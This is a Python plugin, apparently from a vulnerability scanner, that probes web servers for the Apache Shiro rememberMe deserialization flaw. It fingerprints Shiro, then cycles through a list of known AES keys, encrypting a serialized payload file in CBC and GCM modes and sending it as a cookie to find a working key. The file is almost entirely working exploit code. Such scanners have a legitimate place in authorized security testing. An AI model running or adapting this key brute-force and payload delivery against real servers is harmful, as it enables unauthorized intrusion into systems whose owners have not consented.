import base64
import threading
import uuid

from Crypto.Cipher import AES

from vulscan_Project import requestUtil
from .. import fileUtil


class Poc(threading.Thread):
    def __init__(self, key, url, mode):
        threading.Thread.__init__(self)
        self.key = key
        self.url = url
        self.result = False
        self.mode = mode

    def cbc_encrypt(self, key):
        file = fileUtil.open_file("dict_shiro/payload.ser", "rb")
        BS = AES.block_size
        pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()  # 使文件内容满足AES加密长度要求
        mode = AES.MODE_CBC
        iv = uuid.uuid4().bytes
        encryptor = AES.new(base64.b64decode(key), mode, iv)
        file_body = pad(file.read())
        base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
        file.close()
        return str(base64_ciphertext, "UTF-8")

    def gcm_encrypt(self, key):
        file = fileUtil.open_file("dict_shiro/payload.ser", "rb")
        BS = AES.block_size
        mode = AES.MODE_GCM
        iv = uuid.uuid4().bytes
        encryptor = AES.new(base64.b64decode(key), mode, iv)
        pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()  # 使文件内容满足AES加密长度要求
        file_body = pad(file.read())
        enc, tag = encryptor.encrypt_and_digest(file_body)
        base64_ciphertext = base64.b64encode(iv + enc + tag)
        file.close()
        return str(base64_ciphertext, "UTF-8")

    def run(self):
        try:
            encrypt = getattr(self, self.mode + "_encrypt")
            self.cookies = {"rememberMe": encrypt(self.key)}
            resp = requestUtil.get(self.url, cookies=self.cookies)
            if not "rememberme" in str(resp.headers).lower():
                self.result = True
        except:
            pass

    def get_results(self):
        return self.result


def fingerprint(service):
    if service.url:
        resp = requestUtil.get(service.url, cookies="rememberMe=1")
        try:
            if "rememberme" in str(resp.headers).lower():
                return True
        except Exception as e:
            return False


def poc(service):
    key_file = fileUtil.open_file("dict_shiro/key.txt")
    key_list = [k.strip() for k in key_file.readlines()]

    def test(mode):
        shiro_list = []
        for i in key_list:
            key = i.strip()
            shiro_list.append(Poc(key, service.url, mode))
        for s in shiro_list:
            s.start()
        for s in shiro_list:
            s.join()
        for s in shiro_list:
            if s.get_results():
                return ["shiro反序列化漏洞",
                        "Cookie：rememberMe=%s...<br>Mode：%s<br>Key：%s" % (s.cookies["rememberMe"][:10], s.mode, s.key)]
        return ["存在shiro框架", "Cookie：rememberMe=1", "success"]

    result_cbc = test("cbc")
    if len(result_cbc) == 3:
        return test("gcm")
    else:
        return result_cbc
